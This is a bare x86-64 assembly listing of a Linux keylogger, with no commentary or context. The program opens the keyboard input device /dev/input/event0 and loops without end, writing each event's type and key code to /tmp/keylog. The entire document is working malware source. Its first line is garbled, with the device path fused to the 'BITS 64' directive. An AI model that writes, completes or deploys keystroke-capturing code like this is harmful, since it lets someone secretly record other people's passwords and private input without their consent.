/dev/input/event0BITS 64

section .data
    input_dev db "/dev/input/event0", 0
    log_file db "/tmp/keylog", 0
    input_dev_len equ $ - input_dev - 1
    log_file_len equ $ - log_file - 1

section .bss
    event resb 24
    fd_input resq 1
    fd_log resq 1

section .text
global _start

_start:
    xor rax, rax
    mov al, 2
    lea rdi, [input_dev]
    xor rsi, rsi
    syscall
    test rax, rax
    js exit
    mov [fd_input], rax

    mov rax, 2
    lea rdi, [log_file]
    mov rsi, 0x41
    mov rdx, 0o666
    syscall
    test rax, rax
    js exit
    mov [fd_log], rax

loop:
    mov rax, 0
    mov rdi, [fd_input]
    lea rsi, [event]
    mov rdx, 24
    syscall
    test rax, rax
    js exit

    mov rax, 1
    mov rdi, [fd_log]
    lea rsi, [event + 16]
    mov rdx, 4
    syscall

    jmp loop

exit:
    mov rax, 60
    xor rdi, rdi
    syscall
